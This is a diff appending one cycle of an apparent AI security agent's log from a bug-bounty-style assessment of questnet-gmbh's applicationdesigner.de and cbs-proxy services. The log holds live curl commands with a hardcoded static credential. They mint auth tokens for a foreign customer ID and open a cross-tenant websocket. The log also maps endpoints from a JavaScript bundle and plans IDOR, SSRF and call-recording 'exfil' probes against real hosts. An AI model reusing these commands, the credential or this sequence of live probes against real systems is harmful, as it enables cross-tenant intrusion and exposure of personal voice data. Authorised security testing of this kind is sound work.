@@ -14450,3 +14450,197 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 - [RISK] questnet-gmbh: 78 — Both driver findings are now re-confirmed live end-to-end this cycle: (1) cbs-proxy cross-tenant BOLA transport-complete with a freshly minted foreign-cid token (101 + CONNECT/READY), and (2) the auth.php anonymous per-cid mint is FULLY live (the "VPN gate" that capped last cycle's confidence was a placeholder-token artifact, now closed). Voicenotes/download.php additionally shown credential-satisfiable (404-not-auth-reject, cid ignored). Remaining ceiling is unchanged but now purely operational: CBS-side live_debug frame binding and actual audio-byte retrieval, both explicitly withheld per the program PII rule, not because controls were observed. PoC report is well-formed on the demonstrated primitives (HIGH broken-auth/IDOR, CVSS ~7.5-8.6). Risk ticks 76→78 as the last "maybe it was patched" doubt is removed. No PII echoed, no recordings fetched, no live streams subscribed, no mutations.
+===== ANALYST bigpickle 2026-09-08 21:48:25 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -sS --max-time 20 -w "\n__HTTP %{http_code}\n" "https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id=2&srn=100" > /tmp/opencode/auth1.txt 2>&1; cat /tmp/opencode/auth1.txt
+{"success":true,"data":{"auth":"32d596b8bae331ba8b0b8e34217ff87028381a2fcd58c254dc7f54254d74a7d9","ttl":1788903959},"total":1}
+__HTTP 200
+[0m
+[0m$ [0msleep 1; curl -sS -i --max-time 20 "https://cbs-proxy.api.live-manager.de/?origin=LiveDebugger&cid=2&service=100&token=32d596b8bae331ba8b0b8e34217ff87028381a2fcd58c254dc7f54254d74a7d9" -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13" > /tmp/opencode/ws1.txt 2>&1; sleep 1; curl -sS -i --max-time 20 "https://www.applicationdesigner.de/extjs/voicenotes/check.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id=2" > /tmp/opencode/check1.txt 2>&1; echo "=== WS ==="; cat /tmp/opencode/ws1.txt; echo; echo "=== CHECK ==="; cat /tmp/opencode/check1.txt
+=== WS ===
+curl: (28) Operation timed out after 20000 milliseconds with 404 bytes received
+HTTP/1.1 101 Switching Protocols
+Server: nginx/1.30.0
+Date: Tue, 08 Sep 2026 21:45:08 GMT
+Connection: upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
+X-Powered-By: Ratchet/0.4.4
+
+�p{"typ":"proxy","payload":{"status":"CONNECT","description":"Verbunden mit Ziel-Server CBS100"},"_from":"CBS100"}�p{"typ":"proxy","payload":{"status":"CONNECT","description":"Verbunden mit Ziel-Server CBS190"},"_from":"CBS190"}�p{"typ":"proxy","payload":{"status":"CONNECT","description":"Verbunden mit Ziel-Server CBS200"},"_from":"CBS200"}�<{"typ":"proxy","payload":{"status":"READY"},"_from":"PROXY"}
+=== CHECK ===
+HTTP/1.1 200 OK
+Server: nginx/1.30.0
+Date: Tue, 08 Sep 2026 21:45:29 GMT
+Content-Type: application/json
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.3.21
+Set-Cookie: PHPSESSID=76421aa01c7a18500168b542a0791b85; path=/; secure; HttpOnly; SameSite=None; Partitioned
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, OPTIONS
+Access-Control-Allow-Headers: Content-Type, X-Requested-With
+X-Accel-Buffering: no
+Cache-Control: no-cache, no-store, must-revalidate
+
+{"success":true,"total":0,"max_id":0}
+[0m
+Mint still live for foreign cid, WS chain still live, check.php cross-tenant ungated. Now extracting the CallBuilder route map passively from the already-public help.js bundle.
+[0m$ [0mcurl -sS --max-time 30 "https://www.applicationdesigner.de/help.js?ts=$(date +%s)" -o /tmp/opencode/help.js 2>&1; wc -c /tmp/opencode/help.js
+3290201 /tmp/opencode/help.js
+[0m
+[0m✗ [0mGrep "callbuilder|CallBuilder|api/config|api/get|api/add|api/update|api/delete|route|\.php'|\.php"" failed[90m in /tmp/opencode/help.js[0m
+[91m[1mError: [0mRipgrep JSON record exceeded 65536 bytes
+[0m
+[0m$ [0mgrep -o -E '.{60}callbuilder.{120}' /tmp/opencode/help.js | head -40
+ection',{dialog:a,cid:a.context.customerId});a.ws=b}}}},1,['callbuilder-designer'],['component','box','container','callbuilder-designer'],{'component':!0,'box':!0,'container':!0,'callbuilder-
+v.applicationdesigner.de/'}else {APPDESIGNER_API_PATH='/api/callbuilder/';APPDESIGNER_API_PATH_NOPROXY='https://applicationdesigner.de/'}}}help_history=[];dialog=Ext.create('CB.view.main.dial
+[0m
+[0m$ [0mgrep -o -E 'APPDESIGNER_API_PATH[a-zA-Z_]*[^,;}]{0,40}' /tmp/opencode/help.js | sort -u | head; echo '---'; grep -o -E "[a-zA-Z0-9_/\.]+\.php" /tmp/opencode/help.js | sort -u | head -50
+APPDESIGNER_API_PATH!=='undefined'?APPDESIGNER_API_PATH:'/'
+APPDESIGNER_API_PATH+'extjs/agent/get_agent_costs.php'
+APPDESIGNER_API_PATH+'extjs/agent/get_agent_token.php'
+APPDESIGNER_API_PATH+'extjs/chat/provider.php'+BACKEND_TOKEN
+APPDESIGNER_API_PATH+'extjs/chatgpt/provider.php'+BACKEND_TO
+APPDESIGNER_API_PATH+'extjs/check_mailserver.php'
+APPDESIGNER_API_PATH+'extjs/get_provider.php'+BACKEND_TOKEN
+APPDESIGNER_API_PATH+'extjs/get_speaker.php'+BACKEND_TOKEN
+APPDESIGNER_API_PATH+'extjs/get_speaker_languages.php'+BACKE
+APPDESIGNER_API_PATH+'extjs/playback.php'
+---
+/extjs/common/getCustomers.php
+/extjs/flexlist/addRow.php
+/extjs/flexlist/createList.php
+/extjs/flexlist/deleteRow.php
+/extjs/flexlist/getDetails.php
+/extjs/flexlist/getFields.php
+/extjs/flexlist/getList.php
+/extjs/flexlist/importcsv.php
+/extjs/flexlist/saveValue.php
+/extjs/flexlist/updateList.php
+/extjs/get_user_rights.php
+/extjs/livedebugger/auth.php
+/extjs/voicenotes/check.php
+/extjs/voicenotes/delete.php
+/extjs/voicenotes/details.php
+/extjs/voicenotes/download.php
+/extjs/voicenotes/get.php
+AIDesigner/backend/config.php
+AIDesigner/backend/config_coding.php
+AIDesigner/backend/public/coding.php
+AIDesigner/backend/public/index.php
+extjs/agent/get_agent_costs.php
+extjs/agent/get_agent_token.php
+extjs/chat/provider.php
+extjs/chatgpt/provider.php
+extjs/check_mailserver.php
+extjs/encrypt/index.php
+extjs/get_provider.php
+extjs/get_speaker.php
+extjs/get_speaker_languages.php
+extjs/playback.php
+help/content.php
+[0m
+Endpoint map extracted from the public bundle — several never-probed surfaces. Checking the `check_mailserver.php` call signature for SSRF param names.
+[0m$ [0mgrep -o -E '.{80}check_mailserver.{200}' /tmp/opencode/help.js | head -5; echo '==='; grep -o -E '.{60}freshlist.{120}' /tmp/opencode/help.js | head -3; echo '===FLEX==='; grep -o -E "extjs/flexlist/[a-zA-Z]+\.php" /tmp/opencode/help.js | sort | uniq -c; echo '===PLAYBACK==='; grep -o -E '.{40}playback\.php.{120}' /tmp/opencode/help.js | head -3
+nnection,TR.mail.please_wait);Ext.Ajax.request({url:APPDESIGNER_API_PATH+'extjs/check_mailserver.php',useDefaultXhrHeader:!1,method:'POST',params:b,success:function(i){Ext.MessageBox.hide();var a;try{a=Ext.decode(i.responseText)}catch(w){Ext.MessageBox.alert(TR.mail.error,TR.mail.invalid_server_
+nnection,TR.mail.please_wait);Ext.Ajax.request({url:APPDESIGNER_API_PATH+'extjs/check_mailserver.php',useDefaultXhrHeader:!1,method:'POST',params:b,success:function(i){Ext.MessageBox.hide();var a;try{a=Ext.decode(i.responseText)}catch(P){a={success:!1,message:TR.mail.invalid_response}}var g=a.su
+===
+===FLEX===
+      1 extjs/flexlist/addRow.php
+      2 extjs/flexlist/createList.php
+      1 extjs/flexlist/deleteRow.php
+      1 extjs/flexlist/getDetails.php
+      4 extjs/flexlist/getFields.php
+      1 extjs/flexlist/getList.php
+      1 extjs/flexlist/importcsv.php
+      1 extjs/flexlist/saveValue.php
+      1 extjs/flexlist/updateList.php
+===PLAYBACK===
+eturn}var f=APPDESIGNER_API_PATH+'extjs/playback.php';Ext.Ajax.request({url:f,useDefaultXhrHeader:!1,method:'POST',timeout:120000,params:{action:'download',customerId:b.des
+eturn}var f=APPDESIGNER_API_PATH+'extjs/playback.php';Ext.Ajax.request({url:f,useDefaultXhrHeader:!1,method:'POST',timeout:120000,params:{action:'play',customerId:a.designe
+[0m
+[0m$ [0mgrep -o -E '.{120}flexlist/getFields\.php.{120}' /tmp/opencode/help.js | head -2; echo '==='; grep -o -E '.{120}flexlist/getList\.php.{120}' /tmp/opencode/help.js | head -2; echo '===DETAILS==='; grep -o -E '.{120}flexlist/getDetails\.php.{120}' /tmp/opencode/help.js | head -2
+ds:[{name:'id',type:'int',defaultValue:null},{name:'caption',type:'string'}],proxy:{type:'ajax',url:BACKEND_URL+'/extjs/flexlist/getFields.php'+BACKEND_TOKEN,extraParams:{flexlist_id:a.flexlistId},reader:{type:'json',rootProperty:'data'}},autoLoad:!0});a.items=[
+'+d+'" wirklich löschen?',function(d){if(d==='yes'){c.setLoading('Lösche...');Ext.Ajax.request({url:BACKEND_URL+'/extjs/flexlist/getFields.php'+BACKEND_TOKEN,method:'DELETE',params:{id:b.get('id')},success:function(g){c.setLoading(!1);var f=Ext.decode(g.response
+===
+g){var a=this;a.store=Ext.create('Ext.data.Store',{model:'CB.model.FlexList',proxy:{type:'ajax',url:BACKEND_URL+'/extjs/flexlist/getList.php'+BACKEND_TOKEN,reader:{type:'json',rootProperty:'data',totalProperty:'total'},extraParams:{search:''},simpleSortMode:!0
+===DETAILS===
+re=Ext.create('Ext.data.Store',{fields:['row_id'].concat(a.fieldConfigs||[]),proxy:{type:'ajax',url:BACKEND_URL+'/extjs/flexlist/getDetails.php'+BACKEND_TOKEN,extraParams:{flexlist_id:a.flexlistId,search:''},reader:{type:'json',rootProperty:'data',totalProperty:'
+[0m
+## STEP 1 — DELTA
+
+- CHANGED `www.applicationdesigner.de/extjs/livedebugger/auth.php`: contested VPN-gate status **RESOLVED → ACCEPTED**. Clean re-probe with the real public static credential (sha256 `8d2faac1…`) + foreign `customer_id=2` + `srn=100` → HTTP 200 `{"success":true,"data":{"auth":"<fresh 64-hex>","ttl":…}}`. "No VPN detected." was the redacted/placeholder-token artifact; the anonymous per-cid mint is LIVE.
+- CHANGED `cbs-proxy.api.live-manager.de`: freshly minted foreign-cid token upgraded WS → HTTP 101 + CONNECT CBS100/190/200 + PROXY READY frames, byte-identical; banners now `Server: nginx/1.30.0` + `X-Powered-By: Ratchet/0.4.4`. Chain capstone re-live.
+- NEW RAG `www.applicationdesigner.de/help.js` (3.29 MB, fetched): full endpoint map recovered — voicenotes `details.php`/`delete.php`, `playback.php` (POST `action=play|download`+`customerId`), **flexlist CRUD family** (`getList/getFields/getDetails` GET + BACKEND_TOKEN in URL; `addRow/updateList/saveValue/createList/deleteRow/importcsv`), `check_mailserver.php` (POST — **SSRF candidate**), `get_user_rights.php`, `encrypt/index.php`, `agent/get_agent_costs.php`, `chatgpt/provider.php`+BACKEND_TOKEN, `AIDesigner/backend/public/coding.php`. Prior "CallBuilder route list unknown / root-404" park is obsolete — the route family is mapped.
+- NEW `voicenotes/check.php` this cycle: foreign `cid=2` → `{"success":true,"total":0,"max_id":0}` (no gate, empty index — no tenant data touched); headers add `Access-Control-Allow-Origin: *` + `Set-Cookie: PHPSESSID…; SameSite=None; Partitioned`.
+
+## STEP 2 — PRIORITIZE
+
+- PRIO `voicenotes raw-audio family (download/details/playback)`,7.0,business_value=9(PII call recordings)+gate_ease=7(credential-satisfiable, no 403/VPN)+freshness=9
+- PRIO `check_mailserver.php SSRF`,6.5,cloud_surface=8+gate_ease=7(static credential makes POST reachable)+freshness=9
+- PRIO `cbs-proxy BOLA data-plane`,6.3,gate_ease=9(no auth at proxy)+business_value=8(voice/call-flow)+tech=5
+- PRIO `flexlist CRUD read`,6.2,attack_surface=7(generic tenant data tables)+freshness=9+gate_ease=6(token-in-URL GET)
+- PRIO `AIDesigner/backend/public/coding.php dispatch`,4.2,freshness=8 but sibling gate known 403 (index.php?route=)
+
+## STEP 3 — HYPOTHESES
+
+[HYP] cbs-proxy data-plane frame binding for foreign-cid minted token
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin=LiveDebugger&cid={cid}&service={service}&token={minted}
+confidence: 95
+reasoning: Fresh real-credential mint for foreign cid=2 returned HTTP 200 success:true + fresh 64-hex (this cycle); that token upgraded WS → 101 + CONNECT CBS100/190/200 + READY, byte-identical to prior cycles. No token→cid ownership check at mint or router layer.
+evidence_needed: operator presents a foreign-cid-minted token in a live_debug frame and diffs accept vs a demo-tenant control.
+verify_steps: AUTH_HELPED WS upgrade with freshly minted foreign-cid token; send live_debug frame; byte-diff vs demo control.
+impact: cross-tenant live-debug/call-flow stream attach (voice/PII); HIGH, CVSS 7.5 — chain capstone.
+testability: AUTH_HELPED
+
+[HYP] voicenotes raw-audio download gate is credential-satisfiable
+class: IDOR
+asset: www.applicationdesigner.de/extjs/voicenotes/download.php?token={static}&customer_id={cid}&file={uuid} (+ details.php, playback.php POST play/download)
+confidence: 70
+reasoning: download.php already returns HTTP 404 file-not-found byte-identical for cid=131727 and cid=2 with the real static token — reaches the file-lookup stage, no 403/VPN/auth gate; check.php returns success:true for foreign cid (this cycle total:0 max_id:0); details.php/playback.php exist per help.js RAG.
+evidence_needed: operator fetches real audio bytes for a UUID observed in the index (own/demo tenant only, no third-party replay).
+verify_steps: AUTH_HELPED GET download.php for an indexed UUID; confirm audio bytes.
+impact: cross-tenant call-recording/voicemail/explicit-consent audio exfil; HIGH PII.
+testability: AUTH_HELPED
+
+[HYP] flexlist data-grid read across tenants via shared flexlist_id space
+class: IDOR
+asset: www.applicationdesigner.de/extjs/flexlist/getFields.php|getList.php|getDetails.php
+confidence: 45
+reasoning: help.js shows flexlist reads as GET (Ext.data.Store autoLoad) with BACKEND_TOKEN appended to the URL and `flexlist_id`/`search` params — GET is an allowed verb. If flexlist_id is a global id space (not per-customer), sequential ids expose foreign tenant table definitions+rows; gate shape never tested.
+evidence_needed: gate response differential for flexlist_id=0/1/2 with the static credential.
+verify_steps: PASSIVE→PROBE GET getFields.php?token=STATIC&flexlist_id=1 then flexlist_id=0 (2 GETs @1rps, read-only, synthetic ids).
+impact: cross-tenant data-table read (any flexlist payload incl PII); HIGH if ungated.
+testability: PASSIVE
+
+## STEP 4 — SELF-CRITIQUE
+
+- PARKED check_mailserver.php SSRF: POST-only, param names unknown, cannot verify under passive-first GET/HEAD/OPTIONS rule — SSRF stays top-class, revisit only AUTH_HELPED.
+- PARKED callbuilder proxy "unknown routes": RAG resolved the route family; bare-root-404 probe had targeted the wrong hostname (prefix is relative to the designer shell host) — wait for shell host before more active probing.
+- FINAL #1 cbs-proxy data-plane binding (95) — AUTH_HELPED, chain capstone, transport re-confirmed this cycle with a fresh foreign-cid minted token.
+- FINAL #2 voicenote raw-audio exfil (70) — AUTH_HELPED, PII ceiling; index re-confirmed ungated.
+- FINAL #3 flexlist read gate (45) — PASSIVE, the one anonymous-resolvable path remaining.
+- DROPPED: nothing else ≥40 introduced.
+
+## STEP 5 — NEXT ACTION
+
+[NEXT] PROBE: `GET https://www.applicationdesigner.de/extjs/flexlist/getFields.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&flexlist_id=1` then `flexlist_id=0` (2 GETs @1rps, read-only) — map the flexlist gate (expect AIDesigner-style 403 Invalid-token vs 200 `{"success":true,"data":[…]}`).
+
+## STEP 6 — LEARNING
+
+- LEARN ACCEPTED AUTH @ www.applicationdesigner.de/extjs/livedebugger/auth.php: clean re-probe with the REAL public static credential + foreign cid=2 → HTTP 200 success:true, fresh 64-hex auth token, no "No VPN detected." — contested VPN-gate status RESOLVED (same placeholder-token artifact as voicenotes); anonymous per-cid mint still LIVE.
+- LEARN ACCEPTED IDOR @ cbs-proxy.api.live-manager.de: fresh foreign-cid minted token upgraded WS → 101 + CONNECT CBS100/190/200 + READY byte-identical (nginx/1.30.0 fronting Ratchet/0.4.4) — transport chain still LIVE.
+- LEARN ACCEPTED IDOR @ www.applicationdesigner.de/extjs/voicenotes/check.php: foreign cid=2 with real token → success:true total:0 max_id:0, `Access-Control-Allow-Origin: *` + partitioned PHPSESSID — cross-tenant index ungated, empty (no tenant data touched).
+- LEARN NEW MISCONFIG @ www.applicationdesigner.de/help.js: passive RAG recovered full unprobed surface (voicenotes details/delete, playback POST, flexlist CRUD GET family, check_mailserver POST SSRF candidate, get_user_rights, encrypt, agent costs, coding.php) — obsolete "callbuilder route unknown" park.
+- LEARN REJECTED (unchanged, closed): get_agent_token.php session-gated; getCustomers.php token-scoped; wildcard-subdomain-enum 0 dedicated hosts; api.live-manager.de non-resolving; rs-param open redirect absent.
+
+## STEP 7 — RISK
+
+[RISK] questnet-gmbh: 78 — contested auth.php mint status RESOLVED in ACCEPTED direction (anonymous foreign-cid mint live this cycle with fresh 64-hex), and that token still upgrades the cbs-proxy BOLA chain to HTTP 101 + CONNECT/READY (driver confirmed live end-to-end). check.php cross-tenant index re-confirmed ungated; help.js RAG surfaced a broader reachable read surface (voicenotes details/download, flexlist GET CRUD). Ceiling remains AUTH_HELPED (live-debug frame binding + real-audio fetch both need operator context); no live tenant data exposed this cycle (index empty for foreign cid, synthetic ids only).
